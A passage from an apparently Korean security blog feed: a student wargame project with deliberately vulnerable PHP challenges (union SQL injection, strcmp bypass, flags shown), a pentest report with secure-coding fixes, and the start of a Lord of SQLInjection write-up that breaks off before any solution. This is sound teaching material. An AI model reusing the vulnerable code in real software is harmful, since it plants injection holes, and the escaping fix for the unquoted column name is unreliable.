class="string">&quot;login.php&quot;</span>&gt;Login&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">        &lt;h3&gt;&lt;a href=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$url</span><span class="meta">?&gt;</span>&gt;Shop&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#로그인 페이지입니다. login.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_POST[&#x27;id&#x27;]=false;</span></span><br><span class="line"><span class="comment">//$_POST[&#x27;pw&#x27;]=false;</span></span><br><span class="line"><span class="keyword">if</span>((!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))||(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>])))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;nope!!!!&quot;</span>;</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;input ID &amp; PASSWORD !!!!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;kr&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">    &lt;title&gt;login?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">    &lt;form  method=<span class="string">&quot;POST&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">      ID : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      PASSWD : &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pw&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      &lt;br&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;LOGIN&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#shop 페이지입니다. shop.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;shop&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_connect_error())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Failed to Connect MySQL : &quot;</span>.mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$post = $_GET[&#x27;list&#x27;];</span></span><br><span class="line"><span class="variable">$par</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;list&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from book where idx =<span class="subst">$par</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;BOOK NAME : &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;bookname&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;PRICE : &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;STOCK : &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;count&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">//$i=$i+1;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#DataBase</span><br><span class="line"></span><br><span class="line">#테이블 목록</span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_shop |</span><br><span class="line">+----------------+</span><br><span class="line">| book           |</span><br><span class="line">| itemlist       |</span><br><span class="line">| shopusers      |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line">#book 테이블</span><br><span class="line">+-----+-----------+-------+-------+</span><br><span class="line">| idx | bookname  | price | count |</span><br><span class="line">+-----+-----------+-------+-------+</span><br><span class="line">|   1 | WEB       | 14000 |    35 |</span><br><span class="line">|   2 | REVERSING | 19000 |    13 |</span><br><span class="line">|   3 | PWNABLE   | 25000 |    43 |</span><br><span class="line">+-----+-----------+-------+-------+</span><br><span class="line"></span><br><span class="line">#itemlist 테이블</span><br><span class="line">+-----+----------+--------+---------+</span><br><span class="line">| idx | itemname | itemid | itemnum |</span><br><span class="line">+-----+----------+--------+---------+</span><br><span class="line">|   1 | book     | b      |       1 |</span><br><span class="line">|   2 | NULL     | b      |       1 |</span><br><span class="line">+-----+----------+--------+---------+</span><br><span class="line"></span><br><span class="line">#shopusers 테이블</span><br><span class="line">+-----+--------+------------------+----------+</span><br><span class="line">| idx | shopid | shoppass         | joindate |</span><br><span class="line">+-----+--------+------------------+----------+</span><br><span class="line">|   1 | admin  | flag&#123;Uni0n_sq1i&#125; |       30 |</span><br><span class="line">+-----+--------+------------------+----------+</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="PHP-strcmp-취약점"><a href="#PHP-strcmp-취약점" class="headerlink" title="PHP strcmp 취약점"></a>PHP strcmp 취약점</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/strcmp.png">

<br>

<p>PHP strcmp 취약점 문제입니다.</p>
<br>

<p><code>소스</code>는 아래와 같습니다.</p>
<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$passwd</span> = <span class="string">&#x27;flag&#123;StrCmP_f1a9&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error!!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>)&amp;&amp;(strcmp(<span class="variable">$passwd</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])==<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$passwd</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;login failed!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php</span></span><br><span class="line"><span class="string">if(!isset(\$_GET[&#x27;id&#x27;])) || !isset(\$_GET[&#x27;pw&#x27;]))</span></span><br><span class="line"><span class="string">        echo &#x27;error!!&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if((\$_GET[&#x27;id&#x27;] == &#x27;admin&#x27;)&amp;&amp;(strcmp(\$passwd, \$_GET[&#x27;pw&#x27;])==0))</span></span><br><span class="line"><span class="string">        echo \$passwd;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">        echo &#x27;login failed!!!&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> highlight_string(<span class="variable">$code</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="📰-게시판-제작-및-기능-구현"><a href="#📰-게시판-제작-및-기능-구현" class="headerlink" title="📰 게시판 제작 및 기능 구현"></a>📰 게시판 제작 및 기능 구현</h1><br>

<h2 id="메인-페이지-1"><a href="#메인-페이지-1" class="headerlink" title="메인 페이지"></a>메인 페이지</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_main.png" width="70%" heigth="70%">

<br>

<div class="note default"><p>메인 페이지입니다. 최근에 올라온 게시물이 보이고 포인트 랭킹이 있습니다.</p>
</div>

<br>

<br>

<h2 id="회원가입-amp-로그인-1"><a href="#회원가입-amp-로그인-1" class="headerlink" title="회원가입 &amp; 로그인"></a>회원가입 &amp; 로그인</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_register.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_login.png"></div></div></div></p>
<br>

<div class="note default"><p>회원가입 페이지와 로그인 페이지입니다.</p>
<p>워게임 사이트와 별도로 회원가입을 해야합니다.</p>
<p>회원가입 페이지에는 <code>아이디</code> 중복확인 버튼이 있고 <code>패스워드</code>를 입력하는 입력란이 있습니다.</p>
<p>로그인 페이지에는 <code>아이디</code>, <code>패스워드</code> 입력란이 있습니다.</p>
</div>

<br>

<br>

<h2 id="쪽지-페이지"><a href="#쪽지-페이지" class="headerlink" title="쪽지 페이지"></a>쪽지 페이지</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_note.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_note_2.png"></div></div></div></p>
<br>

<div class="note default"><p>쪽지 송수신 페이지입니다..</p>
<p>유저 간 쪽지를 주고 받는 기능이 있습니다.</p>
</div>

<br>

<br>

<h2 id="게시글-작성-페이지"><a href="#게시글-작성-페이지" class="headerlink" title="게시글 작성 페이지"></a>게시글 작성 페이지</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_write.png" width="70%" heigth="70%">

<br>

<div class="note default"><p>게시글 작성 페이지 입니다.</p>
<p>자유게시판과 Q&amp;A 게시판을 선택할 수 있으며 파일을 업로드 할 수 있습니다.</p>
</div>

<br>

<br>

<h2 id="게시글-리스트"><a href="#게시글-리스트" class="headerlink" title="게시글 리스트"></a>게시글 리스트</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_list.png" width="70%" heigth="70%">

<br>

<div class="note default"><p>게시판에 쓴 글이 보이는 페이지입니다.</p>
</div>

<br>

<br>

<hr>
<br>

<h1 id="💉-게시판-모의해킹-및-보고서-작성"><a href="#💉-게시판-모의해킹-및-보고서-작성" class="headerlink" title="💉 게시판 모의해킹 및 보고서 작성"></a>💉 게시판 모의해킹 및 보고서 작성</h1><br>

<p>팀원 별로 각자 보고서를 작성하여 서로 공유하고 부족한 부분을 채워 하나의 보고서를 완성했습니다.</p>
<p>보고서는 <code>OWASP TOP 10</code> 기반으로 작성하였습니다.</p>
<br>

<br>

<h2 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_contents.png">

<br>

<p>보고서의 <code>목차</code> 부분입니다. </p>
<p><code>개요</code>, <code>수행 절차</code>, <code>모의해킹 세부 분석</code>, <code>대응방안</code>, <code>시큐어 코딩</code>, <code>참고 자료</code> 로 나눠져 있습니다.</p>
<br>

<br>

<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_2.png">

<br>

<p>보고서의 <code>개요</code> 부분입니다. 본 모의해킹의 설명이 적혀있습니다.</p>
<p><code>취약점 요약</code>에는 본 사이트에서 나온 취약점을 모아놓았습니다. 어떤 취약점이 있는지 한번에 볼 수 있습니다.</p>
<p><code>대상</code>에는 본 모의해킹의 대상에 대해 설명이 적혀있습니다.</p>
<br>

<br>

<h2 id="수행-절차"><a href="#수행-절차" class="headerlink" title="수행 절차"></a>수행 절차</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_3.png">

<br>

<p>보고서의 <code>수행 절차</code> 부분입니다. </p>
<p><code>점검 방법</code>에는 본 모의해킹의 수행 절차를 설명해놓은 표가 있습니다.</p>
<p><code>점검 할 취약점 항목</code>에는 취약점 항목에 대한 설명이 있습니다. OWSASP TOP 10 기반으로 모의해킹을 하기 때문에 OWASP TOP 10의 항목과 설명을 적어놓은 표가 있습니다.</p>
<br>

<br>

<h2 id="모의해킹-세부-분석"><a href="#모의해킹-세부-분석" class="headerlink" title="모의해킹 세부 분석"></a>모의해킹 세부 분석</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_4.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_5.png">

<br>

<p>모의해킹 세부 분석의 <code>정보수집</code> 부분입니다.</p>
<p><code>nikto</code>, <code>Nmap</code>, <code>Wafw00f</code>를 이용하여 <code>정보수집</code>을 하였습니다.</p>
<p><code>정보수집</code> 결과를 표로 정리해놨습니다.</p>
<br>

<br>

<p><code>세부 분석</code>과 <code>대응 방법</code>은 내용이 많아 <code>A1</code>부분만 적었습니다.</p>
<br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_6.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_7.png">

<br>

<p><code>A1 Injection</code> 입니다. 모의해킹 대상 페이지의 <code>url</code>을 적어놨습니다.</p>
<p>또한 모의해킹 과정(SQL Injection)을 작성했습니다.</p>
<br>

<br>

<h2 id="대응방안"><a href="#대응방안" class="headerlink" title="대응방안"></a>대응방안</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_8.png">

<br>

<p>해당 취약점의 <code>대응방안</code>을 정리해놨습니다.</p>
<br>

<br>

<h2 id="시큐어-코딩"><a href="#시큐어-코딩" class="headerlink" title="시큐어 코딩"></a>시큐어 코딩</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_9.png">

<br>

<p>대상 페이지의 <code>url</code>과 <code>기존 소스코드</code>와 <code>시큐어 코딩이</code> 적용된 코드와 설명이 있습니다.</p>
<br>

<br>

<h3 id="A1-Injection"><a href="#A1-Injection" class="headerlink" title="A1 Injection"></a>A1 Injection</h3><br>

<div class="note danger"><p><strong>기존 소스코드 (시큐어 코딩 X)</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#search_result.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$catagory</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;catgo&#x27;</span>];</span><br><span class="line"><span class="variable">$search_con</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;search&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from board where <span class="subst">$catagory</span> like &#x27;%<span class="subst">$search_con</span>%&#x27; order by num desc&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<div class="note success"><p><strong>시큐어 코딩 소스코드</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#search_result.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$catagory</span> = mysqli_real_escape_string(<span class="variable">$con</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;catgo&#x27;</span>]);</span><br><span class="line"><span class="variable">$search_con</span> = mysqli_real_escape_string(<span class="variable">$con</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;search&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from board where <span class="subst">$catagory</span> like &#x27;%<span class="subst">$search_con</span>%&#x27; order by num desc&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>



<p><code>mysqli_real_escape_string</code> 함수를 사용하여 시큐어 코딩을 해주었습니다.</p>
<p><code>mysqli_real_escape_string</code> 함수는 <code>&#39;</code>, <code>&quot;</code>, <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>\x1a</code> 와 같은 문자 앞에 <code>\</code> 를 붙여서 해당 문자가 실제 작동하지 않도록 이스케이프 해주었습니다.</p>
</div>

<br>

<br>

<h3 id="A7-Cross-Site-Scripting-XXS"><a href="#A7-Cross-Site-Scripting-XXS" class="headerlink" title="A7 Cross-Site Scripting (XXS)"></a>A7 Cross-Site Scripting (XXS)</h3><br>

<div class="note danger"><p><strong>기존 소스코드 (시큐어 코딩 X)</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#board_modify.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_POST</span>[<span class="string">&quot;subject&quot;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update board set subject=&#x27;<span class="subst">$subject</span>&#x27;, content=&#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot; where num=<span class="subst">$num</span>&quot;</span>;</span><br><span class="line">mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<div class="note success"><p><strong>시큐어 코딩 소스코드</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#board_modify.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_POST</span>[<span class="string">&quot;subject&quot;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = htmlspecialchars(<span class="variable">$subject</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$content</span> = htmlspecialchars(<span class="variable">$content</span>, ENT_QUOTES);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update board set subject=&#x27;<span class="subst">$subject</span>&#x27;, content=&#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot; where num=<span class="subst">$num</span>&quot;</span>;</span><br><span class="line">mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<br>

<div class="note danger"><p><strong>기존 소스코드 (시큐어 코딩 X)</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#reply_ok.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_name&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_id&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$no</span> &amp;&amp; <span class="variable">$name</span> &amp;&amp; <span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;insert into reply(con_num,name,id,content) values (<span class="subst">$no</span>, &#x27; </span></span><br><span class="line"><span class="string"><span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$id</span>&#x27;,&#x27;<span class="subst">$content</span>&#x27;);&quot;</span>;</span><br><span class="line"> mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<div class="note success"><p><strong>시큐어 코딩 소스코드</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#reply_ok.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_name&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_id&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = htmlspecialchars(<span class="variable">$no</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$id</span> = htmlspecialchars(<span class="variable">$id</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$content</span> = htmlspecialchars(<span class="variable">$content</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$page</span> = htmlspecialchars(<span class="variable">$page</span>, ENT_QUOTES);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$no</span> &amp;&amp; <span class="variable">$name</span> &amp;&amp; <span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;insert into reply(con_num,name,id,content) values (<span class="subst">$no</span>, &#x27; </span></span><br><span class="line"><span class="string"><span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$id</span>&#x27;,&#x27;<span class="subst">$content</span>&#x27;);&quot;</span>;</span><br><span class="line"> mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>



<p><code>htmlspecialchars</code> 함수는 사용자가 입력한 문자열에서 특정한 특수 문자를 HTML 엔티티로 변환해주는 PHP 함수입니다.</p>
<p>크로스 사이트 스크립팅(XSS) 취약점을 방지하기 위해 사용되며, 사용자가 입력한 문자열 중 <code>&#39;</code>, <code>&quot;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> 문자를 HTML 엔티티 문자로 변환합니다.</p>
</div>

<br>

<br>

]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [8번_troll] Write UP</title>
    <url>/2021/10/02/2021-10-02-Lord_of_SQLInjection_8_troll/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>8번 문제인 troll을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/troll/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin/&quot;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_troll where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;troll&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin/&quot;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_troll where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;troll&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin/&quot;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p>특수문자 <code>&#39;</code>를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<p><code>admin</code> 문자열을 필터링 하고있지만 대소문자는 구분하고 있지 않습니다.</p>
<br>

<br>

<h2 id="3-줄-5-줄-해석"><a href="#3-줄-5-줄-해석" class="headerlink" title="3 줄 ~ 5 줄 해석"></a>3 줄 ~ 5 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_troll where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;troll&quot;</span>);  </span><br></pre></td></tr></table></figure>

